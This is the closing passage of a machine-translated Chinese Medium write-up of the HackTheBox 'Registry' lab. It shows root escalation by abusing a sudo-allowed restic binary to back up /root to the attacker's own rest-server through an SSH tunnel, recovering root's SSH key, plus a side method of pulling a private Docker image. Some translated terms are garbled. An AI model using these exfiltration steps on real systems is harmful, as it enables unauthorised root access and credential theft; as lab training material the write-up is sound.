lm ij bi translated">注意<code class="fe nf ng nh mu b"><strong class="kt ir">f5e86ed9</strong></code> <strong class="kt ir"> </strong>是我们从之前的截图中得到的快照ID。由于备份快照是由root完成的，我们似乎有权限问题。</p><p id="d45b" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">让我们试着备份到我们自己的盒子里。由于出站连接被阻塞，让我们通过SSH隧道进行端口转发。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pk"><img src="../Images/c9e2c78a064287b409ac99f055f16a33.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8niYxBJWyoYXWErWMDzUzg.png"/></div></div></figure><p id="6ad9" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们可以通过使用下面的repo来建立一个rest-server。</p><div class="np nq gp gr nr ns"><a href="https://github.com/restic/rest-server" rel="noopener  ugc nofollow" target="_blank"><div class="nt ab fo"><div class="nu ab nv cl cj nw"><h2 class="bd ir gy z fp nx fr fs ny fu fw ip bi translated">restic/rest-服务器</h2><div class="nz l"><h3 class="bd b gy z fp nx fr fs ny fu fw dk translated">Rest Server是一个高性能的HTTP服务器，它实现了restic的Rest后端API。它提供了安全和…</h3></div><div class="oa l"><p class="bd b dl z fp nx fr fs ny fu fw dk translated">github.com</p></div></div><div class="ob l"><div class="pl l od oe of ob og kp ns"/></div></div></a></div><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="c223" class="my lo iq mu b gy mz na l nb nc"><strong class="mu ir">restic init --repo rest123</strong></span></pre><p id="220d" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">然后开始按<code class="fe nf ng nh mu b"><strong class="kt ir">rest-server</strong></code> <strong class="kt ir"> </strong></p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="38c2" class="my lo iq mu b gy mz na l nb nc"><strong class="mu ir">rest-server --path rest123 --no-auth</strong></span></pre><p id="df01" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">将/root文件夹备份到我们的<code class="fe nf ng nh mu b"><strong class="kt ir">rest123</strong></code> <strong class="kt ir">。</strong></p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="25e6" class="my lo iq mu b gy mz na l nb nc"><strong class="mu ir">sudo /usr/bin/restic -r backup rest:http://127.0.0.1:8000/ /root</strong></span></pre><p id="493f" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">并通过以下方式恢复了快照</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="d99b" class="my lo iq mu b gy mz na l nb nc"><strong class="mu ir">restic -r rest123 restore latest --target restore/</strong></span></pre><p id="bea6" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我获得了root SSH密钥，并以root身份登录</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pm"><img src="../Images/056b58b47af87e1e14367f68c478c637.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tRdRgLUJ86Ypbtu4UA1ygw.png"/></div></div></figure><h1 id="b516" class="ln lo iq bd lp lq lr ls lt lu lv lw lx jw ly jx lz jz ma ka mb kc mc kd md me bi translated">额外的</h1><h2 id="ea8d" class="my lo iq bd lp pn po dn lt pp pq dp lx la pr ps lz le pt pu mb li pv pw md px bi translated">SSH信用的另一种方式</h2><p id="abd4" class="pw-post-body-paragraph kr ks iq kt b ku mf jr kw kx mg ju kz la mh lc ld le mi lg lh li mj lk ll lm ij bi translated">不用下载所有的blobs，我们可以直接提取docker图像并从那里进行枚举。</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="efa5" class="my lo iq mu b gy mz na l nb nc"><strong class="mu ir">The command to pull images from private registry is as follows:</strong></span><span id="1c52" class="my lo iq mu b gy nd na l nb nc"><strong class="mu ir">docker pull HOST:PORT/IMAGE_NAME</strong></span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi py"><img src="../Images/6fac02a2163d99e496ad06e92ba8c96f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5lxIJEcYK1D2xlJasG6ucg.png"/></div></div></figure><p id="c291" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们有一个证书问题。让我们先登录docker注册表。我遵循了中提到的步骤</p><div class="np nq gp gr nr ns"><a href="https://stackoverflow.com/questions/50768317/docker-pull-certificate-signed-by-unknown-authority" rel="noopener  ugc nofollow" target="_blank"><div class="nt ab fo"><div class="nu ab nv cl cj nw"><h2 class="bd ir gy z fp nx fr fs ny fu fw ip bi translated">由未知机构签署的“码头工人拉动”证书</h2><div class="nz l"><h3 class="bd b gy z fp nx fr fs ny fu fw dk translated">感谢贡献一个堆栈溢出的答案！请务必回答问题。提供详细信息并分享…</h3></div><div class="oa l"><p class="bd b dl z fp nx fr fs ny fu fw dk translated">stackoverflow.com</p></div></div><div class="ob l"><div class="pz l od oe of ob og kp ns"/></div></div></a></div><p id="2656" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我从<a class="ae ni" href="https://docker.registry.htb" rel="noopener ugc nofollow" target="_blank">https://docker . registry . htb</a>下载SSL证书，然后</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi qa"><img src="../Images/e31743a83ba590fd2b3d1de2223c4a97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NmaYfx5HNo7GDeAWcGT7FA.png"/></div></div></figure><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="9dd3" class="my lo iq mu b gy mz na l nb nc"><strong class="mu ir">root@kali:~/htb/boxes/registry#</strong> ls                                                                                                                    <br/>docker_fetch  docker_registry_htb.crt  gobust-443.log  gobust-80.log  initial.nmap  install.gz                                                               <br/><strong class="mu ir">root@kali:~/htb/boxes/registry#</strong> cp docker_registry_htb.crt /etc/docker/certs.d/my-registry.example.com:5000/ca.crt                                           <br/>cp: cannot create regular file '/etc/docker/certs.d/my-registry.example.com:5000/ca.crt': No such file or directory                                          <br/><strong class="mu ir">root@kali:~/htb/boxes/registry#</strong> cp docker_registry_htb.crt /etc/docker/certs.d/docker.registry.htb/ca.crt                                                    <br/>cp: cannot create regular file '/etc/docker/certs.d/docker.registry.htb/ca.crt': No such file or directory                                                   <br/><strong class="mu ir">root@kali:~/htb/boxes/registry#</strong> cd /etc/docker/certs.d                                                                                                       <br/>-bash: cd: /etc/docker/certs.d: No such file or directory                                                                                                    <br/><strong class="mu ir">root@kali:~/htb/boxes/registry#</strong> mkdir /etc/docker/certs.d                                                                                                    <br/><strong class="mu ir">root@kali:~/htb/boxes/registry#</strong> mkdir /etc/docker/certs.d/docker.registry.htb                                                                                <br/><strong class="mu ir">root@kali:~/htb/boxes/registry#</strong> cp docker_registry_htb.crt /etc/docker/certs.d/docker.registry.htb/ca.crt</span></pre><p id="8a10" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">然后取出图像，</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi qb"><img src="../Images/b125f99923626cdc2aba36f24c9ea155.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*woNT7sPmqmgLPEHlFO45Sg.png"/></div></div></figure><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="6c28" class="my lo iq mu b gy mz na l nb nc"><strong class="mu ir">root@kali:~/htb/boxes/registry# </strong>docker run -it docker.registry.htb:443/bolt-image:latest<br/><strong class="mu ir">root@b4a768d65575:</strong>/# ls                                                                                                                                               <br/>bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span></pre><p id="9e08" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">感谢阅读，</p><p id="38a9" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">如果你喜欢这篇文章，请留下掌声或评论。</p><p id="9fe2" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">普瑞瑟姆·博玛(【https://twitter.com/PreethamBomma_】T2</p></div></div>    
</body>
</html>